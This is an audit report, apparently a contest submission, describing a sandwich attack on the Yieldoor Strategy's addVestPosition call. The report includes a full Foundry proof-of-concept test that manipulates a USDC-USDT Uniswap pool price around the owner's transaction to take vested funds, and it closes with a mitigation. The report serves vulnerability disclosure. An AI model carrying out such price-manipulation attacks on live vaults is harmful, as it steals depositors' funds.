# Sandwich attack on the addVestPosition call resulting in loss of funds

### Summary

An attacker can execute a sandwich attack on the `addVestPosition` (https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Strategy.sol#L426) call in the case of a position with a narrow range due to insufficiently strict checks against price manipulation.

### Root Cause

In `Strategy.sol:306` (https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Strategy.sol#L304), the check for price manipulation is insufficient because `tickTwapDeviation` must be greater than 1. This leniency enables attackers to exploit narrow position strategies, potentially extracting profit through price manipulation.

### Internal Pre-conditions

1. Admin needs to call `addVestingPosition`
2. `mainPosition` width must be narrow enough (4 ticks or so)

### External Pre-conditions

no

### Attack Path

1. The `attacker` sees the `addVestPosition` transaction in the mempool.
2. The `attacker` deposits an amount approximately 10 times the current TVL of the strategy.
3. The `attacker` manipulates the price so that the checks pass while positioning the price at the edge of the mainPosition.
4. The `owner` executes the `addVestPosition` call.
5. The `attacker` reverts the price back to its original state (or approximately so).
6. The `attacker` withdraws all their shares from the `Vault`.

### Impact

As a result, the attacker immediately receives a significant portion of the vest position, even though the vest position was intended to be distributed over the entire `_vestDuration`.

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /// @notice Swaps `amountIn` of one token for as much as possible of another token
    /// @param params The parameters necessary for the swap, encoded as `ExactInputSingleParams` in calldata
    /// @return amountOut The amount of the received token
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

contract Unit is Test {
    using SafeERC20 for IERC20;

    address public constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address public constant UNISWAP_V3_SWAP_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address vault;
    address strategy;
    address rebalancer = vm.createWallet("rebalancer").addr;
    address feeRecipient = vm.createWallet("feeRecipient").addr;
    address depositor = vm.createWallet("depositor").addr;
    address owner = vm.createWallet("owner").addr;
    address attacker = vm.createWallet("attacker").addr;

    IUniswapV3Pool pool = IUniswapV3Pool(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6); // USDC-USDT-0.01%
    ERC20 token0 = ERC20(pool.token0());
    ERC20 token1 = ERC20(pool.token1());

    // HOW TO RUN: forge test -vvv --fork-url $MAINNET_RPC --fork-block-number 21917372 --match-test testFrontrun
    function testFrontrun() external {
        uint256 attackerSwapAmount0 = 7_100_000 * 1e6; // 7.1m$
        uint256 attackerSwapAmount1;
        uint256 attackerSwapLoss;

        // deploy
        {
            vm.startPrank(owner);
            vault = address(new Vault(address(token0), address(token1)));
            strategy = address(new Strategy(address(pool), address(vault), rebalancer, feeRecipient));
            IVault(vault).setStrategy(strategy);
            Strategy(strategy).setTickTwapDeviation(2); // cannot be 1...
            vm.stopPrank();
        }

        // initial deposit
        {
            vm.startPrank(owner);
            uint256 amount0 = 1000 * (10 ** token0.decimals());
            uint256 amount1 = 1000 * (10 ** token1.decimals());
            deal(address(token0), owner, amount0);
            deal(address(token1), owner, amount1);
            IERC20(token0).safeIncreaseAllowance(address(vault), type(uint256).max);
            IERC20(token1).safeIncreaseAllowance(address(vault), type(uint256).max);
            IVault(vault).deposit(amount0, amount1, 0, 0);
            vm.stopPrank();
        }

        // initial rebalance
        {
            vm.startPrank(rebalancer);
            skip(10 minutes);
            IStrategy(strategy).rebalance();
            IStrategy(strategy).collectFees();
            vm.stopPrank();
        }

        // calculated in offchain by the owner before addVestingPosition is called.
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        (uint256 expectedAmount0, uint256 expectedAmount1) = LiquidityAmounts.getAmountsForLiquidity(
            sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(IStrategy(strategy).getMainPosition().tickLower),
            TickMath.getSqrtRatioAtTick(IStrategy(strategy).getMainPosition().tickUpper),
            0.0001 ether
        );

        console2.log("Vested position: amount0 = %s; amount1 = %s; (~20k$)", expectedAmount0, expectedAmount1);

        // sandwich attack starts:
        uint256 attackerDepositAmount0;
        uint256 attackerDepositAmount1;
        {
            // deposit && price manipulation
            vm.startPrank(attacker);
            uint256 amount0 = 10000 * (10 ** token0.decimals());
            uint256 amount1 = 10000 * (10 ** token1.decimals());
            deal(address(token0), attacker, amount0);
            deal(address(token1), attacker, amount1);
            IERC20(token0).safeIncreaseAllowance(address(vault), type(uint256).max);
            IERC20(token1).safeIncreaseAllowance(address(vault), type(uint256).max);
            (, attackerDepositAmount0, attackerDepositAmount1) = IVault(vault).deposit(amount0, amount1, 0, 0);

            deal(address(token0), attacker, attackerSwapAmount0);
            IERC20(token0).safeIncreaseAllowance(address(UNISWAP_V3_SWAP_ROUTER), type(uint256).max);
            attackerSwapAmount1 = ISwapRouter(UNISWAP_V3_SWAP_ROUTER).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: pool.token0(),
                    tokenOut: pool.token1(),
                    fee: pool.fee(),
                    recipient: attacker,
                    amountIn: attackerSwapAmount0,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0,
                    deadline: type(uint256).max
                })
            );
            vm.stopPrank();
        }

        // vesting position
        {
            vm.startPrank(owner);
            deal(address(token0), owner, expectedAmount0);
            deal(address(token1), owner, expectedAmount1);
            IERC20(token0).safeIncreaseAllowance(address(vault), type(uint256).max);
            IERC20(token1).safeIncreaseAllowance(address(vault), type(uint256).max);
            IVault(vault).addVestingPosition(expectedAmount0, expectedAmount1, 365 days);

            vm.stopPrank();
        }

        // sandwich attack ends:
        uint256 attackerWithdrawAmount0;
        uint256 attackerWithdrawAmount1;
        {
            // price manipulations && full withdrawal
            vm.startPrank(attacker);
            deal(address(token1), attacker, attackerSwapAmount1);
            IERC20(token1).safeIncreaseAllowance(address(UNISWAP_V3_SWAP_ROUTER), type(uint256).max);
            attackerSwapLoss = ISwapRouter(UNISWAP_V3_SWAP_ROUTER).exactInputSingle(
                ISwapRouter.ExactInputSingleParams({
                    tokenIn: pool.token1(),
                    tokenOut: pool.token0(),
                    fee: pool.fee(),
                    recipient: attacker,
                    amountIn: attackerSwapAmount1,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0,
                    deadline: type(uint256).max
                })
            );
            attackerSwapLoss = attackerSwapAmount0 - attackerSwapLoss;

            (attackerWithdrawAmount0, attackerWithdrawAmount1) =
                IVault(vault).withdraw(IVault(vault).balanceOf(attacker), 0, 0);
            vm.stopPrank();
        }

        console2.log(
            "Attack cost: amount0 = %s; amount1 = %s;",
            attackerDepositAmount0 + attackerSwapLoss,
            attackerDepositAmount1
        );

        console2.log("Attack profit: amount0 = %s; amount1 = %s;", attackerWithdrawAmount0, attackerWithdrawAmount1);
        // assuming that usdc == usdt price
        console2.log(
            "Overall profit: (~5k$)",
            (attackerWithdrawAmount0 + attackerWithdrawAmount1)
                - (attackerDepositAmount0 + attackerDepositAmount1 + attackerSwapLoss)
        );
    }
}

### Mitigation

Add stricter checks for price manipulation and enforce stricter validation for the minimum interval width.
